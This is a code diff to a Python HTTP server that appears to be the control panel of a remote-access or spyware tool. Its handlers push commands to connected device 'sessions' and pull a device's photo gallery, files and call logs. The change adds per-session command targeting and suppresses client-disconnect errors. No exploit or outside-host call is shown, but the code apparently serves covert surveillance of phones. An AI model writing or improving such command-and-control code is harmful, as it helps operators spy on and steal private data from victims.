@@ -965,10 +965,22 @@ class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
             return
         command = data.get('command', '')
         args = data.get('args', '{}')
+        session_id = data.get('session_id', None)
         if isinstance(args, dict):
             args = json.dumps(args)
-        self.server_instance.send_command_to_all(command, args)
-        self.send_json_response({'status': 'sent', 'command': command})
+        if session_id is not None:
+            # Send to specific session
+            with self.server_instance.lock:
+                session = self.server_instance.sessions.get(int(session_id))
+            if session and session.connected:
+                self.server_instance.send_command(session, command, args)
+                self.server_instance.log_command(command, int(session_id))
+                self.send_json_response({'status': 'sent', 'command': command, 'session': session_id})
+            else:
+                self.send_json_response({'status': 'error', 'message': 'Session not found or offline'})
+        else:
+            self.server_instance.send_command_to_all(command, args)
+            self.send_json_response({'status': 'sent', 'command': command})
 
     def handle_get_gallery(self, query):
         """Return last gallery list from a device."""
@@ -1091,8 +1103,17 @@ class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
             self.send_header('Content-Disposition', f'inline; filename="{os.path.basename(full_path)}"')
             self.end_headers()
             self.wfile.write(content)
+        except BrokenPipeError:
+            # Client disconnected during download — not a real error, just log it
+            pass
+        except ConnectionResetError:
+            # Client connection reset — same, not a real error
+            pass
         except Exception as e:
-            self.send_error(500, f"Error reading file: {e}")
+            try:
+                self.send_error(500, f"Error reading file: {e}")
+            except (BrokenPipeError, ConnectionResetError):
+                pass  # Client already gone
 
     def handle_get_call_logs(self, query):
         sid = query.get('session', ['1'])[0]
@@ -1138,11 +1159,14 @@ class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
 
     def send_json_response(self, data):
         response = json.dumps(data)
-        self.send_response(200)
-        self.send_header('Content-Type', 'application/json')
-        self.send_header('Content-Length', str(len(response)))
-        self.end_headers()
-        self.wfile.write(response.encode('utf-8'))
+        try:
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/json')
+            self.send_header('Content-Length', str(len(response)))
+            self.end_headers()
+            self.wfile.write(response.encode('utf-8'))
+        except (BrokenPipeError, ConnectionResetError):
+            pass  # Client disconnected — not a real error
 
 
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
